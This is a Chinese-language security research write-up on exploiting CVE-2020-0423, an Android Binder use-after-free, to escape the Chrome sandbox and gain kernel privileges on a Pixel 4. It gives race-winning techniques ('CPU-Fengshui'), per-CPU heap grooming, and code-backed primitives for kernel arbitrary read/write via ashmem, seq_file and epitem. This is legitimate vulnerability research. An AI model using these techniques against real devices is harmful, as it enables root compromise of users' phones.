<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ActivityManagerService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">IActivityManager</span>.<span class="hljs-title">Stub</span>
        <span class="hljs-keyword">implements</span> <span class="hljs-title">Watchdog</span>.<span class="hljs-title">Monitor</span>, <span class="hljs-title">BatteryStatsImpl</span>.<span class="hljs-title">BatteryCallback</span> </span>{
    ... skip ...
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">enforceNotIsolatedCaller</span><span class="hljs-params">(String caller)</span> </span>{
        <span class="hljs-keyword">if</span> (UserHandle.isIsolated(Binder.getCallingUid())) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SecurityException(<span class="hljs-string">"Isolated process not allowed to call "</span> + caller);
        }
    }
    ... skip ...
    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">clearApplicationUserData</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String packageName, <span class="hljs-keyword">boolean</span> keepState,
            <span class="hljs-keyword">final</span> IPackageDataObserver observer, <span class="hljs-keyword">int</span> userId)</span> </span>{
        enforceNotIsolatedCaller(<span class="hljs-string">"clearApplicationUserData"</span>);
        <span class="hljs-keyword">int</span> uid = Binder.getCallingUid();
        <span class="hljs-keyword">int</span> pid = Binder.getCallingPid();
        <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> resolvedUserId = mUserController.handleIncomingUser(pid, uid, userId, <span class="hljs-keyword">false</span>,
                ALLOW_FULL_ONLY, <span class="hljs-string">"clearApplicationUserData"</span>, <span class="hljs-keyword">null</span>);
        ... skip ...
    }
    ... skip ...
}</code></pre>



<p>而我们发现的这枚CVE-2020-0423漏洞并不担心这个问题，因为其触发条件受限极低，仅需能与任意一个Binder服务能够通信即可，这意味着我们可以通过借助这些能够被访问的Binder服务来触发漏洞。</p>



<p><strong>• 有限的系统调用</strong></p>



<p>诸如绑定CPU这类系统调用在沙箱中不再被支持，这对于利用一些条件竞争类型的UAF漏洞可能会造成限制。</p>



<p><strong>• 受限的文件/设备访问权限</strong></p>



<p>沙箱进程有着极为严格的约束限制，来保证即便通过浏览器入口实现了远程代码执行，在沙箱中也面临寸步难行的囧地。尤其是对于文件或设备的写操作有着极为严格的限制。</p>



<p><strong>• 更多的安全防护措施</strong></p>



<p>安卓系统在设计上采用了最小化权限准则，除了约束极为严格的selinux策略，在沙箱进程中还采用了BPF安全机制，设置了白名单机制，只有必要的系统的调用才会被加到这个名单中。这也使得我们在编写漏洞利用时常用的一些系统调用，如CPU/socket/相关的堆喷函数都无法再被调用。</p>



<p><strong>• 在32位的Chrome渲染进程中攻击64位kernel</strong></p>



<p>同一系统调用，32位和64位场景下特性不一致，这在实际编写漏洞利用时会遇到很多意料之外的麻烦，甚至导致一些接口无法使用。同时，对于镜像攻击这类方法在沙箱进程中无法施展，32位的地址空间是无法构造出镜像攻击所需的条件。</p>



<p>安卓内核经过多年的攻防对抗，其安全性得到了极大的提高，引入了包括SELinux, PXN, PAN, KASLR, CFI等在内的一系列防护。想利用这样一枚自身存在诸多限制的条件竞争型漏洞在沙箱进程中成功完成一系列的提权操作，并能稳定控制住内核，听起来总有点crazy。这就像在物资极其匮乏的条件下造一枚“核弹头”，不过好在我们拥有最核心的原料——漏洞。在代表当时谷歌安卓最高安全防御水平的旗舰机型Pixel 4上实现这样一条利用链，也唯有出奇，才能致胜。接下来的章节将会带着大家再度领略这条漏洞利用之路。</p>



<h2>How to spray?</h2>



<p>对于尝试利用这类UAF类型的漏洞，第一步依然是从堆喷、劫持执行流开始。我们在上面的章节中讨论了漏洞转化的方向，下一步是选择堆喷方案。我们必须代码[1]和代码[2]这个竞争窗口之间完成三个动作：1、把binder_node释放掉；2、把释放的slab申请回来；3、修改type对应的内存。但这个漏洞留给我们的竞争窗口非常窄，所以我们面临的第一个问题就是：<strong>如何在非常窄的竞争窗口中通过堆喷控制type？</strong></p>



<p>我们有两种方案：1、<strong>扩大竞争窗口；</strong>2、<strong>让竞争场景出现的更频繁；</strong></p>



<ul><li>对于第一种方案，我们在CVE-2019-2025“水滴”漏洞利用中使用过一种非常有效的方法。这个漏洞在触发的时候，会涉及到mutex锁unlock操作，这个操作最终会调用wake_up_q()函数去唤醒等待同一个mutex锁的线程。如果我们触发漏洞的线程与另一个线程（等待同一个互斥锁）绑定到同一个CPU上，在当前线程调用unlock的时候便会唤醒另一个线程，也就是当前线程会主动让出CPU，这就给我们留下了足够多的时间来完成释放以及后续的堆喷操作。不过，这个方法并不适用于spinlock。</li><li>对于第二种方案，常规的解决方案是将存在条件竞争的线程和堆喷的线程绑定到多核CPU的一个核上去执行。</li></ul>



<pre class="wp-block-code"><code class="hljs cpp"> <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">bind_cpu</span><span class="hljs-params">(<span class="hljs-keyword">int</span> cpu)</span> 
</span>{ 
    <span class="hljs-keyword">cpu_set_t</span> <span class="hljs-built_in">set</span>;CPU_ZERO(&amp;amp;<span class="hljs-built_in">set</span>); 
    CPU_SET(cpu, &amp;amp;<span class="hljs-built_in">set</span>);
    <span class="hljs-keyword">if</span> (sched_setaffinity(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">set</span>), &amp;amp;<span class="hljs-built_in">set</span>) &amp;lt; <span class="hljs-number">0</span>) 
       { log_err(<span class="hljs-string">"sched_setafinnity(): %s\n"</span>, strerror(errno)); <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; } 
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}</code></pre>



<p>因为不具备第一种方案的条件，所以我们只能使用第二种方案。为了验证这个方案的可行性，我们尝试先在untrusted_app域环境中进行测试，在绑定CPU的基础之上，我们找到了一个可以大幅提高堆喷成功率的方案。因为普通应用可以在untrusted_app域中注册Service，所以我们可以自己注册(<a href="https://github.com/bluefrostsecurity/CVE-2020-0041/blob/master/lpe/src/endpoint.c">参考</a>)一个Service，这样Server端发送BC_BUFFER_FREE命令的时机就是完全可控的。接下来，把触发漏洞的Client线程、Service线程和堆喷（堆喷我们使用的是sendmsg接口，具体实现上参考了<a href="https://github.com/bluefrostsecurity/CVE-2020-0041/blob/master/lpe/src/realloc.c">bluefrostsecurity</a>团队的实现方法）线程绑定到同一个CPU上。做完了这两步，再去用堆喷去修改w-&gt;type的成功率就会大大提高。</p>



<p>但是这个方案无法迁移到沙箱环境中，原因主要是两个：1、沙箱中用于绑定CPU的系统调用被禁用了，这是比较关键的原因；2、沙箱环境中不能注册Service，我们只能使用系统原生的service_manager，这就导致释放binder_node的过程不可控。因此如果想要在沙箱中利用这个漏洞，必须要解决的第一个问题就是如何触发漏洞。在这个阶段，我们甚至不考虑使用堆喷去修改w-&gt;type，因为失去了绑定CPU这个功能的辅助，非常窄的竞争窗口使得漏洞触发变成了一件几乎不可能的事。在深入探索之后，我们成功的解决了这个问题，我们不仅可以尝试布局堆，也可以尝试布局CPU。我们熟悉的Heap-Fengshui更多的是从空间布局上来思考，而CPU-Fengshui更多的是从时间上思考，通过影响CPU调度来布局进程的在时间上的分布，这种方法也被我们称为CPU-Fengshui。通过CPU-Fengshui最终来实现各段代码逻辑在运行时间关系上的排列、布局，如果能通过有限的操作来达到布局CPU的效果，将会为漏洞利用的实现创造条件。</p>



<h3>CPU-Fengshui</h3>



<p>首先，我们需要思考一个问题——<strong>绑定CPU为什么能提高条件竞争的成功率？</strong></p>



<p>Android系统是一个基于Linux内核的分时系统，在分时系统中，内核会把一个时间段切割成多个CPU时间片，然后根据特定的调度算法把这些时间片分配给等待执行的线程。除非线程自己主动放弃CPU，每个线程在使用完自己的时间片后才会被强制让出CPU。因此，如果将多个存在竞争的线程绑定到同一个CPU上，内核为了保证每个线程都被调度到，那就必须提高切换线程的频率。线程切换频率越高，就越有可能在竞争窗口切换出去，从而给堆喷提供机会。沿着这个思路，我们在触发漏洞代码中引入了Padding线程。</p>



<pre class="wp-block-code"><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">padding_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span>
</span>{
    <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">int</span> counter = <span class="hljs-number">0</span>;    

    set_thread_name(<span class="hljs-string">"padding_thread"</span>);
    <span class="hljs-keyword">while</span>(!exploit){
        counter++;
    }

    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
}</code></pre>



<p>不难看出，Padding线程是一个CPU密集型的线程，它唯一的操作就是对counter做自加一。在引入这个线程之后，我们发现就算没有CPU绑定，沙箱中也能通过堆喷修改w-&gt;type了，不过漏洞触发时间依旧不太理想。为了找到最优的Padding线程数量，我们在Pixel 4上做了一个简单的<a href="https://github.com/360AlphaLab/cpu-fengshui/blob/main/src/fengshui.c">实验</a>。</p>



<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><img loading="lazy" src="./2021 - Escape from chrome sandbox to root_files/image-20210819110822274-1024x547.png" alt="" class="wp-image-222" width="512" height="274" srcset="https://vul.360.net/wp-content/uploads/2021/08/image-20210819110822274-1024x547.png 1024w, https://vul.360.net/wp-content/uploads/2021/08/image-20210819110822274-300x160.png 300w, https://vul.360.net/wp-content/uploads/2021/08/image-20210819110822274-768x410.png 768w, https://vul.360.net/wp-content/uploads/2021/08/image-20210819110822274.png 1139w" sizes="(max-width: 512px) 100vw, 512px"></figure></div>



<p>从实验结果可以看到，随着Padding线程数量的增加，CPU切换线程的次数是在逐步增加的，但当线程数量超过25之后，这个值就进入了一个稳定的状态。再来看我们关心的漏洞触发线程（Race Thread），当Padding线程数量介于0~25之间时，CPU切换到漏洞触发线程的次数会在一定范围内波动，但当它超过25之后，这个值就呈现明显的下降趋势。依据这些数据，我们可以得出一个结论：<strong>当Padding线程数量是25左右时，CPU切换最为频繁，同时漏洞触发线程获得CPU的次数也能达到一个较高的区间值。</strong></p>



<p>那么，如果将Padding线程数量设置为25，漏洞触发时间是否就是最短的呢？有趣的是，实验结果支持我们的结论。</p>



<p><strong>除了Padding线程数量可以影响漏洞触发时间之外，线程优先级也能作为一个变量来影响实验结果。</strong></p>



<pre class="wp-block-code"><code class="hljs perl"><span class="hljs-keyword">int</span> setprio(<span class="hljs-keyword">int</span> priority)
{
    <span class="hljs-keyword">int</span> ret;

    ret = <span class="hljs-keyword">setpriority</span>(PRIO_PROCESS, <span class="hljs-keyword">syscall</span>(__NR_gettid), priority);
    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)
        log_err(<span class="hljs-string">"setpriority failed, ret %d\n"</span>, ret);

    <span class="hljs-keyword">return</span> ret;
}</code></pre>



<p>通过这段代码，我们可以在沙箱中改变当前线程的优先级。<strong>因为优先级可以直接影响时间片的大小，所以理论上来说也会影响到漏洞触发的成功率</strong>。不过，我们没有通过实验进一步分析这个因素的实际影响，而是采用了一个经验值，因为此时实际的漏洞触发时间已经在可接受的范围内。在调用绑定CPU系统调用场景下，我们可以做到几秒钟时间触发漏洞，而在沙箱环境下，通过这一方法来模拟绑定CPU效果，也可以在十几秒之内成功触发漏洞。</p>



<h3>Heap-Fengshui</h3>



<p>解决了触发漏洞的问题，我们还需要解决堆布局的问题。在内核中，为了保证堆块的使用效率，内核在分配堆块的时候，每个CPU有自己所属的slab。也就是说，如果CPU-0释放了一个大小为128字节的slab，此时CPU-1去申请128字节大小的slab得到的堆块并不是CPU-0刚刚释放的slab，这个slab只有CPU-0自己才能申请回来。但在利用的时候，我们需要提前在内存里面按照特定的顺序填充特定的结构体并预留一些空洞。失去了绑定CPU功能的辅助，一个线程在某一时刻所处的CPU是不确定的，那也就意味着这个线程所做的堆块操作可能不会按照我们预想的方式进行。另一个问题是，我们没有办法控制漏洞在哪个CPU上成功触发，这就要求我们必须给每个CPU都准备独立的堆布局。</p>



<p><strong>如果我们知道线程当前所属CPU，然后再根据当前CPU去做相关的堆布局不就可以了吗？</strong></p>



<p>这样的思路是没有问题的，如果我们使用SYS_getcpu去获取当前CPU，这个问题就可以迎刃而解。但是，沙箱中不允许我们调用这个接口。经过一番探索，我们找到了一个文件<code>/proc/pid/stat</code>，该文件内容如下所示：</p>



<pre class="wp-block-code"><code class="hljs bash">1|blueline:/data/<span class="hljs-built_in">local</span>/tmp $ cat /proc/self/<span class="hljs-built_in">stat</span>                                            
15752 (cat) R 13930 15752 13930 34816 15752 4194304 429 0 0 0 0 0 0 0 20 0 1 0 7227643 11032059904 798 18446744073709551615 428734074880 428734523136 549425406096 0 0 0 0 0 1073775864 0 0 0 17 6 0 0 0 0 0 428734545376 428734555736 429511938048 549425407612 549425407632 549425407632 549425410024 0</code></pre>



<p>通过查看Linux帮助<a href="https://man7.org/linux/man-pages/man5/proc.5.html">文档</a>，我们可以看到这样一段话：</p>



<pre class="wp-block-code"><code class="hljs css">(39) <span class="hljs-selector-tag">processor</span>  %<span class="hljs-selector-tag">d</span>  (<span class="hljs-selector-tag">since</span> <span class="hljs-selector-tag">Linux</span> 2<span class="hljs-selector-class">.2</span><span class="hljs-selector-class">.8</span>)
         <span class="hljs-selector-tag">CPU</span> <span class="hljs-selector-tag">number</span> <span class="hljs-selector-tag">last</span> <span class="hljs-selector-tag">executed</span> <span class="hljs-selector-tag">on</span>.</code></pre>



<p>为了确定这个值就是线程当前所处CPU，我们去查看了一下内核<a href="https://android.googlesource.com/kernel/msm/+/refs/heads/android-msm-crosshatch-4.9-android10/fs/proc/array.c#578">代码</a>。从代码中可以看到，这个信息来自于task_cpu函数，也就是当前线程所属CPU。</p>



<pre class="wp-block-code"><code class="hljs php">    seq_put_decimal_ull(m, <span class="hljs-string">" "</span>, <span class="hljs-number">0</span>);
    seq_put_decimal_ull(m, <span class="hljs-string">" "</span>, <span class="hljs-number">0</span>);
    seq_put_decimal_ll(m, <span class="hljs-string">" "</span>, task-&gt;exit_signal);
    seq_put_decimal_ll(m, <span class="hljs-string">" "</span>, task_cpu(task));     &lt;---------------- 获得线程所属CPU
    seq_put_decimal_ull(m, <span class="hljs-string">" "</span>, task-&gt;rt_priority);
    seq_put_decimal_ull(m, <span class="hljs-string">" "</span>, task-&gt;policy);</code></pre>



<p>确定可以通过<code>/proc/self/stast</code>获取所属CPU之后，我们就可以基于特定CPU做堆布局了。</p>



<h2>Arbitrary address read/write model</h2>



<p>能够成功实现堆喷意味着我们可以控制w-&gt;type，从对该漏洞原理的分析，我们可以触发一个kfree(A+8)的操作。但沙箱中一系列的限制，使得现有的漏洞利用技术无法施展。对于这样一枚条件竞争类型的漏洞，面对内核的重重防护，如果需要多次触发漏洞，其稳定性、成功率、利用难度都会成为极大的问题。这让我们决定从漏洞利用模型的本源上再去重新思考，基于本质原理再寻他路。</p>



<h3><strong>Case study</strong></h3>



<p>我们总结了安卓ROOT历史上一些强大的漏洞利用方式，以其中的一些作为例子：</p>



<ul><li>put_user/get_user，CVE-2013-6282， ARM平台没有校验地址合法性，使得攻击者可以通过这两个系统调用实现任意内核地址读写。</li><li>addr_limit + iovec， 将thread_info-&gt;addr_limit修改为0xFFFFFFFFFFFFFFFE来关掉内核对用户态及内核地址空间地址检查，进而实现稳定的任意地址读写。</li><li>mmap + ret2dir，最初在2014 USENIX会议上提出。用户态映射的内存会分配到内核的physmap区域，实际上达到了一种“看不见的”内存共享的效果。用户态和内核都可以按照各自的地址访问这片共享内存。</li><li>KSMA，通过创建新的页表项来达到一种物理内存共享的效果。</li><li>mmap + sysctl，最近在CVE-2020-0041漏洞利用中使用的方法.。通过在kern_table中插入一个新的节点，使该节点对应的结构体存储在用户态通过mmap分配的内存中，因而攻击者可在用户态直接修改该结构体的内容，同时结合sysctl文件自身的功能来实现稳定的任意地址写。</li></ul>



<p>从上面这几个例子可以看到其中极为关键的两个基本元素，前两者为“指针控制”，第三个例子和第四个例子其实质上是基于“内存共享”，而第五个例子则是同时基于这两者。这是一个有趣的发现，这些利用方式从本质来看竟有着这般关联，而其本质原理竟如此简单。</p>



<h3><strong>Arbitrary read/write model</strong></h3>



<p>我们不妨基于这两个元素来构建模型。</p>



<ul><li>内存共享模型</li></ul>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><img loading="lazy" src="./2021 - Escape from chrome sandbox to root_files/image-20210822221147946.png" alt="" class="wp-image-262" width="356" height="273" srcset="https://vul.360.net/wp-content/uploads/2021/08/image-20210822221147946.png 712w, https://vul.360.net/wp-content/uploads/2021/08/image-20210822221147946-300x230.png 300w" sizes="(max-width: 356px) 100vw, 356px"></figure></div>



<p>不用限定于具体的是哪种实现方式，需要使其达到物理内存共享的效果，对其中一者（Struct A）的改动可同步影响到另一者（Struct B）。</p>



<ul><li>指针控制模型</li></ul>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><img loading="lazy" src="./2021 - Escape from chrome sandbox to root_files/image-20210824002513540.png" alt="" class="wp-image-233" width="325" height="156" srcset="https://vul.360.net/wp-content/uploads/2021/08/image-20210824002513540.png 649w, https://vul.360.net/wp-content/uploads/2021/08/image-20210824002513540-300x144.png 300w" sizes="(max-width: 325px) 100vw, 325px"></figure></div>



<p>指针控制这种场景的关键在于找到含有指针成员变量的结构体，且该指针将被用于read/write业务逻辑，比较理想的场景是可通过调用系统调用稳定的触发这一read/write业务逻辑。</p>



<h3>Exploitation strategies</h3>



<p>我们在内核源码，以及公开资料中寻找适用于这两种模型的结构体，最后发现了其中的三个结构体。这些结构体像化学试剂一样，单独存在时威力有限，而一旦将其按照一定的流程组合起来将会发生奇妙的化学反应，并爆发出强大的威力。</p>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><img loading="lazy" src="./2021 - Escape from chrome sandbox to root_files/image-20210824020855990.png" alt="" class="wp-image-224" width="322" height="196" srcset="https://vul.360.net/wp-content/uploads/2021/08/image-20210824020855990.png 643w, https://vul.360.net/wp-content/uploads/2021/08/image-20210824020855990-300x183.png 300w" sizes="(max-width: 322px) 100vw, 322px"></figure></div>



<p>接下来我们来具体看一下这三个结构体的特点。</p>



<p><strong>• 基于Ashmem来实现任意地址读写</strong></p>



<pre class="wp-block-code"><code class="hljs cpp">(gdb) pt /o <span class="hljs-keyword">struct</span> file
<span class="hljs-comment">/* offset  */</span>  type = <span class="hljs-keyword">struct</span> file {
...skip…
<span class="hljs-comment">/*  184    */</span>    u64 f_version;
<span class="hljs-comment">/*  192    */</span>    <span class="hljs-keyword">void</span> *f_security;
<span class="hljs-comment">/*  200    */</span>    <span class="hljs-keyword">void</span> *private_data;    &lt;---------------- 尝试控制private_data
<span class="hljs-comment">/*  208    */</span>    <span class="hljs-keyword">struct</span> list_head {
<span class="hljs-comment">/*  208    */</span>        <span class="hljs-keyword">struct</span> list_head *next;
<span class="hljs-comment">/*  216    */</span>        <span class="hljs-keyword">struct</span> list_head *prev;

                       <span class="hljs-comment">/* total size (bytes):   16 */</span>
                       } f_ep_links;
...skip…
                       <span class="hljs-comment">/* total size (bytes):  256 */</span>
                    }</code></pre>



<p>这里的private_data会被当做asma使用。</p>



<pre class="wp-block-code"><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">ashmem_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> cmd, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg)</span>
</span>{
    <span class="hljs-keyword">struct</span> ashmem_area *asma = file-&gt;private_data;  &lt;---------------- 在触发ashmem_ioctl()时，file-&gt;private_data会被赋值给asma
    <span class="hljs-keyword">long</span> ret = -ENOTTY;

    <span class="hljs-keyword">switch</span> (cmd) {
    <span class="hljs-keyword">case</span> ASHMEM_SET_NAME:
        ret = set_name(asma, (<span class="hljs-keyword">void</span> __user *)arg);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> ASHMEM_GET_NAME:
        ret = get_name(asma, (<span class="hljs-keyword">void</span> __user *)arg);
        <span class="hljs-keyword">break</span>;
    ... skip ...
    <span class="hljs-keyword">return</span> ret;
}</code></pre>



<p>在get_name()函数中可通过(1)(2)两处代码逻辑来实现任意地址读。</p>



<pre class="wp-block-code"><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">get_name</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ashmem_area *asma, <span class="hljs-keyword">void</span> __user *name)</span>
</span>{
  ... skip ...
  <span class="hljs-keyword">if</span> (asma-&gt;name[ASHMEM_NAME_PREFIX_LEN] != <span class="hljs-string">'\0'</span>) {
     ... skip ...
    len = <span class="hljs-built_in">strlen</span>(asma-&gt;name + ASHMEM_NAME_PREFIX_LEN) + <span class="hljs-number">1</span>;
    <span class="hljs-built_in">memcpy</span>(local_name, asma-&gt;name + ASHMEM_NAME_PREFIX_LEN, len);    &lt;---------------- (<span class="hljs-number">1</span>)
  } <span class="hljs-keyword">else</span> {
    len = <span class="hljs-keyword">sizeof</span>(ASHMEM_NAME_DEF);
    <span class="hljs-built_in">memcpy</span>(local_name, ASHMEM_NAME_DEF, len);
  }
   ... skip ...
  <span class="hljs-keyword">if</span> (unlikely(copy_to_user(name, local_name, len)))    &lt;---------------- (<span class="hljs-number">2</span>)
    ret = -EFAULT;
  <span class="hljs-keyword">return</span> ret;
}</code></pre>



<p><strong>基于ashmem来实现read</strong></p>



<p>之后可借助set_prot_mask()及set_name()中的两处代码逻辑实现任意地址写。</p>



<pre class="wp-block-code"><code class="hljs objectivec"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> set_prot_mask(<span class="hljs-keyword">struct</span> ashmem_area *asma, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> prot)
{
  …skip…
  <span class="hljs-comment">/* the user can only remove, not add, protection bits */</span>
  <span class="hljs-keyword">if</span> (unlikely((asma-&gt;prot_mask &amp; prot) != prot)) {
    ret = -EINVAL;
    <span class="hljs-keyword">goto</span> <span class="hljs-keyword">out</span>;
  }

  <span class="hljs-comment">/* does the application expect PROT_READ to imply PROT_EXEC? */</span>
  <span class="hljs-keyword">if</span> ((prot &amp; PROT_READ) &amp;&amp; (current-&gt;personality &amp; READ_I<span class="hljs-built_in">MPLIES_EXEC</span>))
    prot |= PROT_EXEC;

  asma-&gt;prot_mask = prot;    &lt;---------------- 任意地址写
  …skip…
}</code></pre>



<p>也可通过调用set_name()来实现任意地址写。</p>



<pre class="wp-block-code"><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">set_name</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ashmem_area *asma, <span class="hljs-keyword">void</span> __user *name)</span>
</span>{
  ... skip ...
  len = strncpy_from_user(local_name, name, ASHMEM_NAME_LEN);
  <span class="hljs-keyword">if</span> (len &lt; <span class="hljs-number">0</span>)
    <span class="hljs-keyword">return</span> len;
  <span class="hljs-keyword">if</span> (len == ASHMEM_NAME_LEN)
    local_name[ASHMEM_NAME_LEN - <span class="hljs-number">1</span>] = <span class="hljs-string">'\0'</span>;
  mutex_lock(&amp;ashmem_mutex);
  <span class="hljs-comment">/* cannot change an existing mapping's name */</span>
  <span class="hljs-keyword">if</span> (unlikely(asma-&gt;file))
    ret = -EINVAL;
  <span class="hljs-keyword">else</span>
    <span class="hljs-built_in">strcpy</span>(asma-&gt;name + ASHMEM_NAME_PREFIX_LEN, local_name);    &lt;---------------- 任意地址写

  mutex_unlock(&amp;ashmem_mutex);
  <span class="hljs-keyword">return</span> ret;
}</code></pre>



<p><strong>• 基于Seqfile来实现任意地址读写</strong></p>



<p>对于seq_file结构体可通过控制buf指针。</p>



<pre class="wp-block-code"><code class="hljs cpp"><span class="hljs-keyword">struct</span> seq_file                                                                        
{
    <span class="hljs-keyword">char</span> *buf;    &lt;---------------- 尝试控制buf
    <span class="hljs-keyword">size_t</span> size;
    <span class="hljs-keyword">size_t</span> from;
    <span class="hljs-keyword">size_t</span> count;
    <span class="hljs-keyword">size_t</span> pad_until;
    <span class="hljs-keyword">loff_t</span> index;
    <span class="hljs-keyword">loff_t</span> read_pos;
    u64 version;
    <span class="hljs-keyword">struct</span> mutex lock;
    <span class="hljs-keyword">const</span> <span class="hljs-keyword">struct</span> seq_operations *op;
    <span class="hljs-keyword">int</span> poll_event;
    <span class="hljs-keyword">const</span> <span class="hljs-keyword">struct</span> file *file;
    <span class="hljs-keyword">void</span> *<span class="hljs-keyword">private</span>;
};     </code></pre>



<p>之后便可以借助seq_read()函数中所示代码逻辑实现任意地址读。</p>



<pre class="wp-block-code"><code class="hljs php">ssize_t seq_read(struct file *file, char __user *buf, 
        size_t size, loff_t *ppos)
{
    struct seq_file *m = file-&gt;private_data; &lt;---------------- m为seq_file类型指针
    ... skip ...
    <span class="hljs-comment">/* if not empty - flush it first */</span>
    <span class="hljs-keyword">if</span> (m-&gt;count) {
        n = min(m-&gt;count, size);
        err = copy_to_user(buf, m-&gt;buf + m-&gt;from, n);    &lt;---------------- 任意地址读
        ... skip ...
    }
    <span class="hljs-comment">/* we need at least one record in buffer */</span>
    pos = m-&gt;index;
    p = m-&gt;op-&gt;start(m, &amp;pos);
    ... skip ...
}</code></pre>



<p>借助/proc/tid/comm来实现任意写的方法非常有趣。通过查阅这部分的代码逻辑我们可以知道，当从comm文件读取内容时，comm_show()函数会在文件指针指向头部的情况下被触发（可通过主动调用lseek来构造这一条件），这个函数会将保存在task-&gt;comm中的线程名通过调用seq_printf函数写入到seq_file-&gt;buf指向的内存，因此可以借助这个逻辑来实现任意写的效果。而控制task-&gt;comm内容的方法有两种，一种是将内容直接写入到/proc/tid/comm文件，第二种是通过调用prctl(SET_NAME, name)来修改。上面提及到在高度沙箱化的渲染进程中，对文件写操作有着极为严格的限制，我们甚至不具备写/proc/tid/comm的权限，所以在利用中我们实际采用的是第二种方法。</p>



<pre class="wp-block-code"><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">comm_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-keyword">void</span> *v)</span>
</span>{
    <span class="hljs-keyword">struct</span> inode *inode = m-&gt;<span class="hljs-keyword">private</span>;
    <span class="hljs-keyword">struct</span> task_struct *p;
    p = get_proc_task(inode);
    <span class="hljs-keyword">if</span> (!p)
        <span class="hljs-keyword">return</span> -ESRCH;
    task_lock(p);
    seq_printf(m, <span class="hljs-string">"%s\n"</span>, p-&gt;comm); <span class="hljs-comment">// call seq_printf to write p-&gt;comm into seq_file-&gt;buf    &lt;---------------- (1)</span>
    task_unlock(p);                                                         
    put_task_struct(p);                                                     
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;                                                               
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">seq_printf</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *f, ...)</span>
</span>{
    va_list args;

    va_start(args, f);
    seq_vprintf(m, f, args);    &lt;---------------- (<span class="hljs-number">2</span>)
    va_end(args);
}
EXPORT_SYMBOL(seq_printf);

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">seq_vprintf</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *f, 
            va_list args)</span>
</span>{
    <span class="hljs-keyword">int</span> len;
    <span class="hljs-keyword">if</span> (m-&gt;count &lt; m-&gt;size) {
        len = vsnprintf(m-&gt;buf + m-&gt;count, m-&gt;size - m-&gt;count, f, args);    &lt;---------------- (<span class="hljs-number">3</span>)
        <span class="hljs-keyword">if</span> (m-&gt;count + len &lt; m-&gt;size) {                                     
            m-&gt;count += len;
            <span class="hljs-keyword">return</span>;
        }
    }
    seq_set_overflow(m);
}</code></pre>



<p><strong>• 基于Epitem来实现固定地址的任意写</strong></p>



<p>epitem和上面两个结构体不同，其data字段可通过调用系统调用epoll_ctl()来进行设置，这相当于实现了内核固定地址上稳定的8-bytes任意值写入。</p>



<pre class="wp-block-code"><code class="hljs cs">(gdb) pt /o <span class="hljs-keyword">struct</span> epitem epitem                           
<span class="hljs-comment">/* offset    |  size */</span>  type = <span class="hljs-keyword">struct</span> epitem {
                       ... skip ...
<span class="hljs-comment">/*  112      |    16 */</span>    <span class="hljs-keyword">struct</span> epoll_event {
<span class="hljs-comment">/*  112      |     4 */</span>        __u32 events;
<span class="hljs-comment">/* XXX  4-byte hole  */</span>
<span class="hljs-comment">/*  120      |     8 */</span>        __u64 data;    &lt;---------------- 可通过调用系统调用稳定的修改data
                               <span class="hljs-comment">/* total size (bytes):   16 */</span>
                           } <span class="hljs-keyword">event</span>;
                           <span class="hljs-comment">/* total size (bytes):  128 */</span>
                         }  </code></pre>



<pre class="wp-block-code"><code class="hljs cs"><span class="hljs-keyword">int</span> pfd[<span class="hljs-number">2</span>];
<span class="hljs-keyword">int</span> epoll_fd;
<span class="hljs-keyword">struct</span> epoll_event evt;

pipe(pfd);
epoll_fd = epoll_create1(<span class="hljs-number">0</span>);
epitem_add(epoll_fd, pfd[<span class="hljs-number">0</span>]);

bzero(&amp;evt, <span class="hljs-keyword">sizeof</span>(evt));
evt.events = <span class="hljs-keyword">event</span>;
evt.data.u64 = data;
epoll_ctl(ep, EPOLL_CTL_MOD, epoll_fd, &amp;evt);</code></pre>



